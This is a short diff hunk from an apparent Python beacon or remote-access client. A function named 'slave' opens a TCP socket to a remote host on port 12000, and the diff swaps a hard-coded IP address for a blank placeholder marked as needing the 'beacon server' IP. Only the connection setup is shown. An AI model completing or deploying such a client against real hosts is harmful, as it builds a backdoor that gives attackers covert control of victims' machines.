@@ -5,7 +5,7 @@ import base64
 
 
 def slave():
-    HOST = '139.59.69.35'    # The remote host
+    HOST = ''    # needs IP of beacon server
     PORT = 12000               # The same port as used by the server
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((HOST, PORT))
